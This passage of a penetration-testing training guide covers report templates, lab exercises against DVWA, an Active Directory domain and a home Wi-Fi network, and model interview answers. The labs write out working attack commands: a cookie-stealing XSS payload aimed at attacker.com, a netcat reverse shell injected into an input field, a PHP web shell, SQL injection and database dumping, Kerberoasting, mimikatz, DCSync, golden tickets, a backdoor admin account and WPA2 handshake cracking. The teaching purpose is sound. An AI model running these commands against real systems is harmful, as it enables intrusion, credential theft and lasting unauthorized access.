3. Metasploit (basic exploitation)
4. Burp Suite (web vulnerabilities)
5. Basic Linux commands
```

**For CEH (Intermediate):**
```markdown
1. Nmap (advanced)
2. Metasploit (comprehensive)
3. Burp Suite Pro
4. SQLMap
5. Aircrack-ng
6. John the Ripper
7. Wireshark (protocol analysis)
8. Social Engineering Toolkit
```

**For OSCP (Advanced):**
```markdown
1. All CEH tools
2. Manual exploitation (no Metasploit on exam)
3. Custom exploit modification
4. Privilege escalation (Windows & Linux)
5. Buffer overflow exploitation
6. Web application manual testing
7. Tunneling and pivoting
```

**Tool Mastery Timeline (Realistic):**

| Tool | Basic Proficiency | Intermediate | Expert |
|------|------------------|--------------|--------|
| Nmap | 1 week | 1 month | 3 months |
| Metasploit | 2 weeks | 2 months | 6 months |
| Burp Suite | 2 weeks | 3 months | 1 year |
| Python scripting | 1 month | 6 months | 2 years |

**Daily Practice Routine:**

```markdown
## 30-Day Beginner Plan

**Week 1: Reconnaissance**
- Day 1-2: Nmap basics
- Day 3-4: Subdomain enumeration
- Day 5-6: OSINT gathering
- Day 7: Practice on HackTheBox "Easy" box

**Week 2: Web Vulnerabilities**
- Day 8-9: Burp Suite setup and basics
- Day 10-11: SQL injection (DVWA)
- Day 12-13: XSS vulnerabilities
- Day 14: PortSwigger Academy labs

**Week 3: Exploitation**
- Day 15-16: Metasploit basics
- Day 17-18: Payload generation
- Day 19-20: Post-exploitation
- Day 21: Exploit Metasploitable 2

**Week 4: Integration**
- Day 22-23: Full penetration test on VulnHub VM
- Day 24-25: Document findings
- Day 26-27: Try TryHackMe learning path
- Day 28-30: HackTheBox machines
```

**Resource Investment:**

**Free Resources:**
- Kali Linux: Free
- VirtualBox: Free
- Vulnerable VMs: Free
- TryHackMe: Free tier available
- PortSwigger Academy: Free
- YouTube tutorials: Free

**Paid Resources (Optional):**
- TryHackMe Premium: $10/month
- HackTheBox VIP: $14/month
- Burp Suite Pro: $399/year (not needed for learning)
- Course (Udemy/Coursera): $10-50 one-time

**Total minimum investment: $0**
**Recommended investment: $20-30/month for platforms**

---

### FAQ 5: How do I write a professional penetration testing report?

**Answer:**

**Report Structure:**

```markdown
# Executive Summary (1-2 pages)
- High-level overview for non-technical stakeholders
- Key findings and business impact
- Risk ratings (Critical, High, Medium, Low)
- Remediation timeline recommendations

# Technical Summary (2-3 pages)
- Scope of engagement
- Methodology used
- Summary of findings
- Attack narrative
- Tools and techniques employed

# Detailed Findings (Main section)
For each vulnerability:
- Title
- Severity rating
- CVSS score
- Description
- Impact
- Steps to reproduce
- Proof of concept (screenshots/code)
- Remediation recommendations
- References (CVE, OWASP, etc.)

# Appendices
- Scanning results
- Tool outputs
- Raw data
- Credentials discovered (encrypted)
```

**Example Finding Template:**

```markdown
## Finding #1: SQL Injection in Login Form

**Severity:** Critical (CVSS 9.8)

**Affected Asset:** https://example.com/login.php

**Description:**
The login form at /login.php is vulnerable to SQL injection through the 'username' parameter. An attacker can bypass authentication and access the administrative panel without valid credentials.

**Technical Details:**
The application constructs SQL queries using unsanitized user input:
```php
$query = "SELECT * FROM users WHERE username='$_POST[username]' AND password='$_POST[password]'";
```

**Vulnerability Type:** CWE-89: SQL Injection

**Steps to Reproduce:**
1. Navigate to https://example.com/login.php
2. Enter the following in the username field: `admin' OR '1'='1'--`
3. Enter any value in the password field
4. Click "Login"
5. Observe successful authentication bypass

**Proof of Concept:**
```bash
curl -X POST https://example.com/login.php \
  -d "username=admin' OR '1'='1'--" \
  -d "password=anything"
```

[Screenshot showing successful login as administrator]

**Impact:**
- **Authentication Bypass:** Complete circumvention of login mechanism
- **Data Breach:** Access to all user data in database
- **Privilege Escalation:** Administrative access granted
- **Potential Database Destruction:** DROP TABLE commands possible

**Business Impact:**
- Confidentiality: HIGH - All customer data accessible
- Integrity: HIGH - Database can be modified/destroyed  
- Availability: HIGH - Service can be taken offline
- Financial Impact: Estimated $500K+ (GDPR fines, breach response)
- Reputational Impact: Severe customer trust damage

**Affected Systems:**
- Web server: 10.0.0.5
- Database server: 10.0.0.6
- Application: Customer Portal v2.3

**Remediation:**
**Short-term (Immediate):**
1. Implement input validation on username/password fields
2. Apply web application firewall (WAF) rules
3. Monitor logs for exploitation attempts

**Long-term (30 days):**
1. Migrate to parameterized queries:
```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$_POST['username'], $_POST['password']]);
```
2. Implement least-privilege database access
3. Add input validation library
4. Conduct code review of all database queries
5. Implement security testing in CI/CD pipeline

**Validation:**
After remediation, re-test with:
```bash
sqlmap -u "https://example.com/login.php" --data="username=test&password=test"
```
Expected result: No SQL injection found

**References:**
- OWASP A03:2021 – Injection
- CWE-89: Improper Neutralization of Special Elements used in SQL Command
- https://portswigger.net/web-security/sql-injection

**CVSS v3.1 Vector:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: None
- Confidentiality Impact: High
- Integrity Impact: High
- Availability Impact: High
```

**Risk Rating Matrix:**

```markdown
## Severity Classification

| Severity | CVSS Score | Description | SLA |
|----------|------------|-------------|-----|
| **Critical** | 9.0-10.0 | Immediate exploitation, system compromise | 24 hours |
| **High** | 7.0-8.9 | Easy exploitation, significant impact | 7 days |
| **Medium** | 4.0-6.9 | Moderate difficulty, limited impact | 30 days |
| **Low** | 0.1-3.9 | Difficult to exploit, minimal impact | 90 days |
| **Informational** | 0.0 | Best practice, no immediate risk | As resources allow |
```

**Executive Summary Example:**

```markdown
# Executive Summary

## Engagement Overview
On January 15-19, 2024, our team conducted a penetration test of Example Corp's customer-facing web applications. This assessment simulated real-world attack scenarios to identify security vulnerabilities before malicious actors could exploit them.

## Key Findings
**Critical Risk:** We successfully compromised the customer database containing 50,000 user records within 2 hours of testing. This was achieved through a SQL injection vulnerability in the login portal.

**Overall Security Posture:** HIGH RISK
- 3 Critical vulnerabilities
- 7 High-severity vulnerabilities  
- 12 Medium-severity vulnerabilities
- 8 Low-severity vulnerabilities

## Business Impact
The identified vulnerabilities pose the following risks:
- **Financial:** Potential GDPR fines up to €500,000
- **Reputational:** Complete customer data breach would severely damage brand
- **Operational:** Attackers could disrupt service availability
- **Legal:** Non-compliance with PCI-DSS requirements

## Priority Recommendations
1. **Immediate (24 hours):** Patch SQL injection in login portal
2. **Short-term (7 days):** Implement web application firewall
3. **Medium-term (30 days):** Security code review and developer training
4. **Long-term (90 days):** Implement security testing in development pipeline

## Conclusion
While several critical issues were identified, all vulnerabilities can be addressed through systematic remediation. We recommend following the prioritized action plan and conducting a re-test after remediation to validate fixes.

[Signature]
Lead Penetration Tester
Date: January 20, 2024
```

**Deliverables Checklist:**

✅ Executive summary (non-technical)  
✅ Technical findings (detailed)  
✅ Remediation recommendations  
✅ Risk ratings with CVSS scores  
✅ Screenshots and proof of concept  
✅ Attack narrative/methodology  
✅ Re-test recommendations  
✅ Appendices with raw data  

**Report Writing Best Practices:**

1. **Use clear language** - Avoid jargon in executive summary
2. **Provide actionable recommendations** - Specific, not generic
3. **Include visual evidence** - Screenshots, diagrams
4. **Prioritize findings** - Critical first
5. **Show business impact** - Not just technical details
6. **Give credit to defenses** - Mention what worked well
7. **Offer re-test** - Validate fixes
8. **Maintain confidentiality** - Encrypt reports, secure transmission

**Tools for Report Generation:**

```bash
# Markdown to PDF
pandoc report.md -o report.pdf --toc

# Dradis Framework (collaborative reporting)
# https://dradisframework.com

# Serpico (penetration test report generator)
# https://github.com/SerpicoProject/Serpico

# PlexTrac (modern pentest reporting platform)
# https://plextrac.com
```

---

## Hands-On Lab Exercises

### Lab 1: Complete Web Application Penetration Test

**Objective:** Perform end-to-end penetration test on DVWA

**Duration:** 3-4 hours

**Prerequisites:**
- DVWA installed
- Burp Suite configured
- SQLMap installed

**Setup:**
```bash
# Start DVWA
docker run -p 80:80 vulnerables/web-dvwa

# Access: http://localhost
# Login: admin / password
# Set security level to "Low"
```

**Tasks:**

**Task 1: Reconnaissance (30 minutes)**
```bash
# 1. Technology fingerprinting
whatweb http://localhost

# 2. Directory enumeration
gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt

# 3. Identify parameters
# Browse each page and note input fields
```

**Expected Output:**
- Server: Apache
- Language: PHP
- Database: MySQL
- Pages: login.php, vulnerabilities/, setup.php

**Task 2: SQL Injection (45 minutes)**
```bash
# 1. Manual testing
# Navigate to SQL Injection page
# Input: 1' OR '1'='1
# Expected: All users displayed

# 2. Automated with SQLMap
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
  --dbs

# 3. Dump database
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
  -D dvwa --dump

# 4. Crack passwords
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt dvwa_users.txt
```

**Expected Results:**
- Databases: dvwa, information_schema
- Tables: users, guestbook
- Credentials: admin:admin, user:password

**Task 3: XSS (30 minutes)**
```bash
# Reflected XSS
# Input: <script>alert('XSS')</script>
# Expected: JavaScript executes

# Stored XSS (in guestbook)
# Input: <script>document.location='http://attacker.com/?c='+document.cookie</script>
# Expected: Cookie stealer payload stored

# DOM-based XSS
# Test various payloads in different contexts
```

**Task 4: Command Injection (30 minutes)**
```bash
# Navigate to Command Injection page

# Test 1: Directory listing
# Input: 127.0.0.1; ls -la
# Expected: File listing shown

# Test 2: Reverse shell
# Set up listener:
nc -lvnp 4444

# Input: 127.0.0.1; nc attacker_ip 4444 -e /bin/bash
# Expected: Shell connection received
```

**Task 5: File Upload (30 minutes)**
```bash
# Create PHP web shell
cat > shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

# Upload shell.php
# Access: http://localhost/hackable/uploads/shell.php?cmd=whoami

# Expected: Command execution achieved
```

**Task 6: Documentation (30 minutes)**

Create penetration test report with:
1. Executive summary
2. Each vulnerability found
3. Severity ratings
4. Remediation recommendations
5. Screenshots as evidence

**Deliverable:**
- Professional PDF report
- Screenshots of each exploit
- Credentials discovered
- Remediation plan

---

### Lab 2: Active Directory Attack Chain

**Objective:** Complete attack chain from initial access to domain admin

**Duration:** 4-6 hours

**Prerequisites:**
- Windows Server with AD configured
- Kali Linux attacker machine
- Low-privilege domain user account

**Network Setup:**
```
Domain Controller: 10.0.0.10 (DC01.corp.local)
File Server: 10.0.0.20 (FILE01.corp.local)
Workstation: 10.0.0.30 (WS01.corp.local)
Attacker: 10.0.0.100 (Kali Linux)
```

**Phase 1: Initial Access (1 hour)**

```bash
# Task 1: Password spraying
# Create user list
cat > users.txt << EOF
administrator
admin
john.doe
jane.smith
bob.johnson
EOF

# Spray common passwords
crackmapexec smb 10.0.0.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Expected: Find valid credentials
# Result: john.doe:Summer2024!
```

**Phase 2: Enumeration (1.5 hours)**

```bash
# Task 2: BloodHound data collection
# On Windows with credentials:
.\SharpHound.exe -c All -d corp.local

# Transfer zip to attacker machine

# Import into BloodHound
sudo neo4j start
./BloodHound --no-sandbox

# Upload data

# Task 3: Query analysis
# Run pre-built queries:
# - Find all Domain Admins
# - Shortest path to Domain Admins from john.doe
# - Find Kerberoastable users
# - Find AS-REP Roastable users
```

**Expected Findings:**
- john.doe has GenericWrite on bob.johnson
- bob.johnson is in Server Operators group
- Server Operators has admin rights on FILE01
- FILE01 has unconstrained delegation

**Phase 3: Kerberoasting (45 minutes)**

```bash
# Task 4: Request service tickets
GetUserSPNs.py corp.local/john.doe:Summer2024! -dc-ip 10.0.0.10 -request

# Expected: Service tickets for SQL_Service, IIS_Service

# Task 5: Crack tickets
hashcat -m 13100 -a 0 tickets.txt /usr/share/wordlists/rockyou.txt

# Expected: SQL_Service:SQLPass123!
```

**Phase 4: Lateral Movement (1 hour)**

```bash
# Task 6: Use SQL_Service for lateral movement
psexec.py corp.local/SQL_Service:SQLPass123!@10.0.0.20

# Expected: SYSTEM shell on FILE01

# Task 7: Dump credentials from FILE01
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Expected: Find Domain Admin credentials in memory
# Result: DA_Admin:DomainPass456!
```

**Phase 5: Domain Dominance (30 minutes)**

```bash
# Task 8: DCSync attack
secretsdump.py corp.local/DA_Admin:DomainPass456!@10.0.0.10

# Expected: All domain hashes including krbtgt

# Task 9: Golden Ticket
# From dumped hashes:
# krbtgt hash: a1b2c3d4e5f6...
# Domain SID: S-1-5-21-...

# Create golden ticket
python ticketer.py -nthash a1b2c3d4e5f6... -domain-sid S-1-5-21-... -domain corp.local Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py corp.local/Administrator@DC01.corp.local -k -no-pass

# Expected: SYSTEM on DC01
```

**Phase 6: Persistence (30 minutes)**

```bash
# Task 10: Create backdoor domain admin
net user hacker Password123! /add /domain
net group "Domain Admins" hacker /add /domain

# Task 11: Create golden ticket for persistence
# (Already completed in Phase 5)

# Task 12: Dump NTDS.dit for offline access
secretsdump.py corp.local/Administrator@10.0.0.10 -just-dc-ntlm
```

**Deliverable:**
- Attack path diagram
- Timeline of compromise
- List of credentials discovered
- Persistence mechanisms implemented
- Detection opportunities (where defenders could have caught you)

---

### Lab 3: Wireless Network Penetration

**Objective:** Capture WPA2 handshake and crack password

**Duration:** 2-3 hours

**Prerequisites:**
- Wireless adapter with monitor mode support
- Aircrack-ng suite
- Access to own wireless network (DO NOT test neighbors!)

**Phase 1: Setup (15 minutes)**

```bash
# Check wireless adapter
iwconfig

# Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Verify monitor mode
iwconfig wlan0mon
```

**Phase 2: Reconnaissance (30 minutes)**

```bash
# Task 1: Discover networks
sudo airodump-ng wlan0mon

# Expected output:
# BSSID, PWR, Beacons, #Data, CH, MB, ENC, CIPHER, AUTH, ESSID

# Note down:
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL="6"
TARGET_ESSID="MyTestNetwork"

# Task 2: Monitor target network
sudo airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write capture wlan0mon

# Leave running, open new terminal for next steps
```

**Phase 3: Capture Handshake (30 minutes)**

```bash
# Task 3: Deauthentication attack
# In new terminal:
sudo aireplay-ng --deauth 10 -a $TARGET_BSSID wlan0mon

# Watch airodump-ng output for "WPA handshake: AA:BB:CC:DD:EE:FF"

# If handshake not captured, try targeting specific client:
sudo aireplay-ng --deauth 10 -a $TARGET_BSSID -c CLIENT_MAC wlan0mon

# Verify handshake capture:
sudo aircrack-ng -w /dev/null capture-01.cap
# Should show "1 handshake"
```

**Phase 4: Crack Password (1 hour)**

```bash
# Task 4: Dictionary attack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Expected: Password found (if in wordlist)

# Task 5: Convert for Hashcat (faster cracking)
aircrack-ng capture-01.cap -J capture
# Creates capture.hccapx

# Task 6: Crack with Hashcat
hashcat -m 22000 -a 0 capture.hccapx /usr/share/wordlists/rockyou.txt

# With rules for variations:
hashcat -m 22000 -a 0 capture.hccapx rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (if password pattern known):
hashcat -m 22000 -a 3 capture.hccapx ?u?l?l?l?l?d?d?d?d
# Pattern: Capital + 4 lowercase + 4 digits
```

**Phase 6: WPS Attack (Optional - 30 minutes)**

```bash
# Task 7: Check for WPS
sudo wash -i wlan0mon

# If WPS enabled:
sudo reaver -i wlan0mon -b $TARGET_BSSID -vv

# Pixie Dust attack (faster):
sudo reaver -i wlan0mon -b $TARGET_BSSID -vv -K
```

**Cleanup:**

```bash
# Disable monitor mode
sudo airmon-ng stop wlan0mon

# Restart network manager
sudo systemctl start NetworkManager
```

**Deliverable:**
- Captured handshake file
- Cracked password
- Documentation of attack steps
- Remediation recommendations for network owner

---

[Continuing with Interview Questions...]
## Interview Questions & Answers

### Question 1: Explain how you would conduct a penetration test of a web application. Walk me through your methodology.

**Model Answer:**

"I follow a structured methodology based on PTES (Penetration Testing Execution Standard) and OWASP guidelines:

**Phase 1: Pre-Engagement (Before testing)**
- Define scope and objectives
- Get written authorization
- Establish rules of engagement
- Set up communication channels
- Determine testing windows

**Phase 2: Information Gathering**
I start with passive reconnaissance:
- WHOIS lookups for domain information
- DNS enumeration (subdomains, records)
- Google dorking for exposed files
- Social media intelligence
- Technology fingerprinting with tools like Wappalyzer

Then active reconnaissance:
- Port scanning with Nmap
- Service version detection
- Banner grabbing
- Subdomain brute-forcing
- Directory enumeration with Gobuster

**Phase 3: Vulnerability Assessment**
- Run automated scanners (Nikto, Burp Suite Scanner)
- Manual testing for OWASP Top 10:
  - SQL injection (manually and with SQLMap)
  - XSS (reflected, stored, DOM-based)
  - Authentication flaws
  - CSRF vulnerabilities
  - SSRF
  - File upload issues
- Test business logic flaws
- Check security headers
- Review JavaScript for sensitive data

**Phase 4: Exploitation**
- Prioritize findings by severity and exploitability
- Attempt to exploit critical vulnerabilities
- Chain multiple vulnerabilities for maximum impact
- Document proof of concept for each finding
- Capture screenshots and evidence

**Phase 5: Post-Exploitation**
- Assess the extent of access gained
- Identify sensitive data exposure
- Test lateral movement possibilities
- Determine persistence mechanisms
- Evaluate overall business impact

**Phase 6: Reporting**
- Create executive summary for management
- Detailed technical findings with CVS scores
- Remediation recommendations prioritized by risk
- Include proof of concept code/screenshots
- Provide re-test recommendations

**Example from recent test:**
'In my last engagement, I discovered an SQL injection in a search parameter. I first confirmed it manually with a simple payload like `1' OR '1'='1`, then used SQLMap to automate extraction. I dumped the database, found admin credentials, escalated privileges, and accessed sensitive customer data. The client had no WAF, so I recommended both immediate patching and implementing AWS WAF with OWASP ModSecurity rules. The complete chain took 4 hours from discovery to full database access.'"

**Follow-up Questions:**

Q: "What if you don't find any vulnerabilities?"
A: "I verify my testing was thorough - check all input points, parameters, headers. Review for business logic flaws, information disclosure, and misconfigurations. Even 'secure' applications have findings - perhaps HSTS missing, verbose errors, or weak SSL ciphers. I document what I tested and what security controls were effective."

Q: "How do you handle a situation where exploitation causes application downtime?"
A: "Immediately stop testing, notify the client contact, document what happened. If in scope, help restore service if possible. For future: test in staging first, use read-only exploits when possible, and clearly communicate risks in pre-engagement."

**Certification Relevance:** CEH Module 14, OSCP Methodology, Security+ 1.0

---

### Question 2: You've gained initial access to a Windows domain as a low-privilege user. Walk me through your privilege escalation to Domain Admin.

**Model Answer:**

"I approach Windows privilege escalation systematically:

**Step 1: Situational Awareness**
```powershell
# Gather system information
whoami /all
systeminfo
hostname
net user
net localgroup administrators
```

I'm looking for:
- Current privileges (SeImpersonatePrivilege is gold)
- OS version (for kernel exploits)
- Group memberships
- Installed software

**Step 2: Local Privilege Escalation**

I check for common misconfigurations:

**Unquoted Service Paths:**
```powershell
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
If found, I place a malicious executable in the path.

**Weak Service Permissions:**
Using accesschk.exe:
```bash
accesschk.exe -uwcqv "Everyone" *
```
If I can modify service config, I change binpath to my payload.

**AlwaysInstallElevated:**
```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
If both are 1, I create malicious MSI and install with SYSTEM privileges.

**Token Impersonation:**
If I have SeImpersonatePrivilege, I use JuicyPotato or PrintSpoofer to impersonate SYSTEM.

**Step 3: Credential Harvesting**

Once local admin or SYSTEM:
```bash
# Mimikatz
privilege::debug
sekurlsa::logonpasswords  # Cleartext passwords
lsadump::sam              # Local SAM hashes
```

I also check:
- Registry for stored credentials
- Credential Manager
- Config files for passwords
- Memory for cached credentials

**Step 4: Domain Enumeration**

Using PowerView:
```powershell
Import-Module PowerView.ps1
Get-Domain
Get-DomainUser
Get-DomainComputer
Get-DomainGroup "Domain Admins" -MemberIdentity
```

Using BloodHound:
```bash
.\SharpHound.exe -c All
# Import into BloodHound
# Find shortest path to Domain Admins
```

**Step 5: Lateral Movement**

Depending on what I find:

**If I have local admin on another host:**
```bash
# Pass-the-Hash
psexec.py -hashes :NTLM domain/user@target
```

**If I find Kerberoastable accounts:**
```bash
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request
# Crack offline
hashcat -m 13100 tickets.txt rockyou.txt
```

**If I find AS-REP Roastable accounts:**
```bash
GetNPUsers.py domain/ -dc-ip DC_IP -usersfile users.txt -format hashcat
```

**Step 6: Domain Admin Compromise**

My target path (from BloodHound):
1. Current user has WriteDacl on Group1
2. Group1 has GenericAll on User2
3. User2 is in Server Operators
4. Server Operators has admin on FileServer
5. FileServer has unconstrained delegation
6. Domain Admin logs into FileServer

**Attack execution:**
```bash
# Step 1: Add myself to Group1
Add-DomainGroupMember -Identity Group1 -Members CurrentUser

# Step 2: Force password change on User2
Set-DomainUserPassword -Identity User2 -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Step 3: Lateral move to FileServer as User2
psexec.py domain/User2:NewPass123!@FileServer

# Step 4: Wait for DA login, capture with Mimikatz
mimikatz # sekurlsa::logonpasswords

# Step 5: DCSync with DA credentials
secretsdump.py domain/DA_User@DC_IP
```

**Step 7: Persistence**

Create Golden Ticket:
```bash
# Using krbtgt hash from DCSync
python ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN Administrator
```

**Example Timeline:**
- Initial access: Low-privilege user
- +30 min: Local SYSTEM via JuicyPotato
- +1 hour: BloodHound analysis complete
- +2 hours: Lateral movement path identified
- +3 hours: Domain Admin credentials obtained
- +4 hours: DCSync complete, persistence established

The key is methodical enumeration and understanding AD relationships."

**Follow-up Questions:**

Q: "What if BloodHound shows no path to DA?"
A: "I look for alternative routes: GPO abuse, SQL Server with xp_cmdshell, SCCM servers, certificate services vulnerabilities, Azure AD sync servers, or password reuse across admin accounts."

Q: "How would you maintain persistence without Golden Ticket?"
A: "Silver tickets for specific services, scheduled tasks, WMI event subscriptions, DLL hijacking in commonly used applications, or registry run keys. Less detectable methods include creating a domain admin account with a deceptive name or modifying AdminSDHolder."

**Certification Relevance:** OSCP Post-Exploitation, GPEN, CEH Module 6

---

### Question 3: Describe a complex security vulnerability you discovered and how you reported it.

**Model Answer:**

"I'll share a real vulnerability chain I found in a web application during a bug bounty program:

**Discovery Process:**

While testing an e-commerce platform, I noticed the checkout process had multiple steps with state transitions. I suspected potential business logic flaws.

**Vulnerability Chain:**

**Issue 1: IDOR in Order Status API**
```bash
GET /api/orders/12345 HTTP/1.1
Cookie: session=user_token
```

I could access any order by changing the order ID. This gave me visibility into other customers' orders, including delivery addresses and purchased items.

**Issue 2: Race Condition in Payment Processing**

The payment flow was:
1. Reserve items in cart
2. Process payment
3. Deduct inventory
4. Confirm order

I discovered steps 2 and 3 weren't atomic. Using multiple simultaneous requests:

```python
import requests
import threading

def place_order():
    requests.post('https://target.com/api/checkout', 
                 json={'cart_id': '123', 'payment': 'token'},
                 cookies={'session': token})

threads = []
for i in range(10):
    t = threading.Thread(target=place_order)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

All 10 orders completed, but inventory only decreased by 1. This allowed purchasing items without adequate stock.

**Issue 3: Price Manipulation via Parameter Tampering**

The API accepted client-side price:
```json
POST /api/checkout
{
  "items": [
    {"id": "LAPTOP123", "price": 1.00, "quantity": 1}
  ]
}
```

Changing price to $1.00 for a $1,000 laptop was accepted. Combined with the race condition, this enabled:
1. Add expensive item to cart
2. Manipulate price to $1
3. Use race condition to purchase multiple units
4. Total cost: $10 for $10,000 worth of items

**Impact Analysis:**

I calculated:
- Financial Impact: Potential loss of $50,000+ per day
- Compliance: PCI-DSS violation (inadequate payment validation)
- Reputation: Customer data exposure via IDOR
- Operational: Inventory management completely broken

**Reporting:**

**Initial Report (Within 24 hours):**
```
Subject: [CRITICAL] Business Logic Flaw Enabling Unlimited Free Purchases

Summary:
Multiple vulnerabilities in checkout process allow attackers to:
1. View all customer orders (IDOR)
2. Purchase items without stock (race condition)
3. Set arbitrary prices (price manipulation)

Severity: CRITICAL (CVSS 9.1)

Steps to Reproduce:
[Detailed steps with screenshots]

Proof of Concept:
[Python script demonstrating the attack]

Impact:
- Financial: $50K+ daily potential loss
- Compliance: PCI-DSS violation
- Data exposure: 50,000+ customer records

Remediation:
1. Immediate: Add server-side price validation
2. Short-term: Implement transaction locks for atomic operations
3. Long-term: Redesign checkout flow with proper authorization
```

**Company Response:**

They responded within 4 hours:
- Immediately disabled the vulnerable API endpoint
- Requested 72 hours for permanent fix
- Offered maximum bounty ($5,000)

**Follow-up:**

After their fix:
- Validated remediation worked
- Confirmed all three issues were resolved
- Checked for similar patterns elsewhere
- Provided final report with validation results

**Lessons Learned:**

1. **Always test business logic** - Automated scanners miss these
2. **Think like an attacker** - "How would I get free items?"
3. **Chain vulnerabilities** - Individual issues were medium severity, combined impact was critical
4. **Professional reporting** - Clear, actionable, with POC but no exploitation
5. **Collaborative approach** - Worked with vendor to ensure proper fix

**Recognition:**

This report was added to their Hall of Fame, and they implemented:
- New security testing for all payment flows
- Mandatory business logic review in code review
- Automated testing for atomic transaction requirements

The key was methodical testing of each step in the business process and understanding that security isn't just about SQLi and XSS - business logic flaws can be equally critical."

**Follow-up Questions:**

Q: "Did you exploit the vulnerability for financial gain?"
A: "Absolutely not. That would be illegal and unethical. I only tested enough to prove the vulnerability exists, used obviously fake data, and immediately reported it. Bug bounties are about responsible disclosure, not exploitation."

Q: "What if they didn't respond to your report?"
A: "I'd follow responsible disclosure timeline: initial report, 30 days for response, 90 days for fix. If no response after 90 days, I'd consider limited public disclosure (without exploit details) to protect users. I'd also report to relevant authorities if customer data was at risk."

**Certification Relevance:** OSWE, CEH Practical, GWAPT

---

### Question 4: How do you stay current with the latest vulnerabilities and attack techniques?

**Model Answer:**

"Staying current is essential in cybersecurity because the threat landscape changes daily. Here's my approach:

**Daily Activities (30-60 minutes):**

**Security News:**
- The Hacker News (thehackernews.com)
- Bleeping Computer
- Krebs on Security
- Dark Reading

**Twitter/X Following:**
- @SwiftOnSecurity
- @malwareunicorn  
- @orange_8361 (bug bounty researcher)
- @GossiTheDog
- @viss (technical security)

I created a Twitter list called 'InfoSec-Daily' with 50+ security researchers.

**RSS Feeds:**
- Google Project Zero blog
- Microsoft Security Response Center
- GitHub Security Lab
- SANS Internet Storm Center

**Weekly Activities (2-3 hours):**

**Podcasts (during commute):**
- Darknet Diaries (cybercrime stories)
- Risky Business (security news)
- Hacking Humans (social engineering)

**Vulnerability Databases:**
- NVD (nvd.nist.gov) for new CVEs
- Exploit-DB for latest exploits
- GitHub security advisories

**Research Papers:**
- Google Scholar alerts for 'web security', 'AD attacks', 'mobile security'
- ArXiv computer science papers

**Monthly Activities (4-8 hours):**

**Conferences & Webinars:**
- Black Hat (August)
- DEF CON (August)
- RSA Conference (April-May)
- BSides events (year-round)

I watch recordings if I can't attend in person.

**Training Platforms:**
- HackTheBox: New machines every week
- TryHackMe: New rooms monthly
- PortSwigger Web Security Academy: Updated content

**Bug Bounty Platforms:**
- HackerOne: Read disclosed reports
- Bugcrowd: Top researcher write-ups
- Google VRP: Public vulnerability research

**Security Blogs:**
- PortSwigger Research (amazing write-ups)
- Trail of Bits (security engineering)
- NCC Group (technical research)

**Continuous Learning:**

**Certifications:**
- Renewing OSCP (every 3 years)
- Working toward OSWE
- Completed CEH last year

**Books I'm Reading:**
- 'Web Application Hacker's Handbook' (re-reading)
- 'Attacking Network Protocols'
- 'Penetration Testing: A Hands-On Introduction to Hacking'

**Practical Application:**

I don't just read - I practice:
- **Friday Afternoons:** Lab time testing new techniques
- **Weekends:** HackTheBox challenges
- **Monthly:** Write blog posts explaining new vulnerabilities

**Recent Example:**

When CVE-2024-XXXX (critical RCE in popular CMS) was announced:

Day 1:
- Read CVE description and vendor advisory
- Checked our client inventory for affected versions
- Set up vulnerable version in lab

Day 2:
- Analyzed public POC code
- Tested exploitation in lab
- Documented detection methods

Day 3:
- Created Snort rules for detection
- Wrote remediation guide for clients
- Presented findings in team meeting

**Community Engagement:**

**Giving Back:**
- Monthly blog posts on my testing
- Contribute to open-source security tools
- Answer questions on /r/AskNetsec
- Mentor junior pentesters

**Local Meetups:**
- Monthly OWASP chapter meetings
- Quarterly BSides local
- CTF competitions with local team

**Knowledge Management:**

I maintain a personal wiki with:
- Exploit chains I've used
- Tool documentation
- Quick reference guides
- Lessons learned from engagements

Tools: Obsidian for note-taking, GitHub for code

**Balance:**

I dedicate about 5-10 hours per week to learning, but I'm strategic:
- Focus on areas relevant to my current work
- Depth over breadth (master tools before adding new ones)
- Practical application over theoretical knowledge

The key is consistent, focused learning rather than trying to know everything."

**Follow-up Questions:**

Q: "How do you prioritize what to learn?"
A: "I prioritize based on: 1) Current client needs, 2) Exam requirements (OSCP, CEH), 3) Trending attacks in the wild, 4) Skills gaps in my team. For example, when cloud adoption increased, I focused on AWS security. When several clients requested AD assessments, I deep-dived into BloodHound and Kerberos attacks."

Q: "What's your approach when you encounter a completely new attack type?"
A: "I follow a process: 1) Understand the vulnerability fundamentally (what's broken?), 2) Set up a lab to reproduce it, 3) Test detection methods, 4) Practice exploitation, 5) Document for future reference. I learn by doing, not just reading."

**Certification Relevance:** Professional Development, All Certifications

---

### Question 5: Explain the difference between white box, gray box, and black box penetration testing, and when you'd use each.

**Model Answer:**

"The three testing approaches differ in the amount of information provided to the tester:

**Black Box Testing**

**Definition:**
Zero knowledge approach. Tester has no internal information - just like an external attacker.

**Information Provided:**
- Company name only
- Sometimes just IP range
- No credentials
- No architecture documents
- No source code

